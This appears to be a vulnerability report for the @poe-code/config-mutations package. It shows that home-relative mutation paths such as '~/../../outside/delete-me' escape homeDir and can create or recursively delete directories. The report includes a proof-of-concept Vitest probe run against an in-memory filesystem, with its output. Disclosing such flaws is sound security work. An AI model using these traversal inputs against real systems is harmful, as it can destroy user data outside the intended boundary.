# Config mutations home-relative path traversal creates and deletes outside home

## Summary

`@poe-code/config-mutations` documents mutation targets as home-relative paths that must start with `~`, but path resolution accepts traversal components after that prefix. Targets such as `~/../../outside/created` and `~/../../outside/delete-me` normalize outside the supplied `homeDir`, allowing public file mutations to create or recursively delete directories outside the advertised home-scoped mutation boundary.

## Reproduction

Run a transient Vitest probe from the repository root:

```sh
cat > packages/config-mutations/src/__probe__.test.ts <<'PROBE'
import { describe, expect, it } from "vitest";
import { Volume, createFsFromVolume } from "memfs";
import { fileMutation, runMutations } from "./index.js";

describe("home-relative mutation containment", () => {
  it("creates and deletes outside home through traversal segments", async () => {
    const vol = new Volume();
    const fs = createFsFromVolume(vol).promises as never;
    vol.mkdirSync("/outside/delete-me", { recursive: true });
    vol.writeFileSync("/outside/delete-me/marker.txt", "outside");

    const createOutcome = await runMutations(
      [fileMutation.ensureDirectory({ path: "~/../../outside/created" })],
      { fs, homeDir: "/home/test" }
    );
    const removeOutcome = await runMutations(
      [fileMutation.removeDirectory({ path: "~/../../outside/delete-me", force: true })],
      { fs, homeDir: "/home/test" }
    );
    const created = vol.existsSync("/outside/created");
    const deleted = !vol.existsSync("/outside/delete-me");
    console.log(JSON.stringify({ createOutcome, removeOutcome, created, deleted }));
    expect(created).toBe(true);
    expect(deleted).toBe(true);
  });
});
PROBE
npm exec -- vitest run packages/config-mutations/src/__probe__.test.ts --reporter verbose
rm packages/config-mutations/src/__probe__.test.ts
```

Output:

```text
{"createOutcome":{"changed":true,"effects":[{"changed":true,"effect":"mkdir","detail":"create"}]},"removeOutcome":{"changed":true,"effects":[{"changed":true,"effect":"delete","detail":"delete"}]},"created":true,"deleted":true}
✓ packages/config-mutations/src/__probe__.test.ts > home-relative mutation containment > creates and deletes outside home through traversal segments
```

## Observed Behavior

`validateHomePath()` requires only that a target string start with `~` at `packages/config-mutations/src/execution/path-utils.ts:33` through `packages/config-mutations/src/execution/path-utils.ts:47`. `expandHome()` then joins the remaining path components directly beneath `homeDir` at `packages/config-mutations/src/execution/path-utils.ts:7` through `packages/config-mutations/src/execution/path-utils.ts:31`, allowing `..` segments to normalize above the home directory. `resolvePath()` returns that escaped path at `packages/config-mutations/src/execution/path-utils.ts:55` through `packages/config-mutations/src/execution/path-utils.ts:75`, and public ensure/remove directory mutations operate on it at `packages/config-mutations/src/execution/apply-mutation.ts:165` through `packages/config-mutations/src/execution/apply-mutation.ts:303`.

## Expected Behavior

Mutation paths advertised and validated as home-relative should remain canonically contained beneath the configured `homeDir`. Traversal components that escape that boundary should be rejected before any create, write, chmod, backup, or deletion operation occurs.

## Impact

A provider manifest, template, plugin, or value resolver able to supply a mutation target can redirect home-scoped configuration operations into arbitrary accessible filesystem locations. Destructive cleanup may recursively delete unrelated user data outside home-managed configuration areas, while setup operations may create or mutate unexpected external directories.
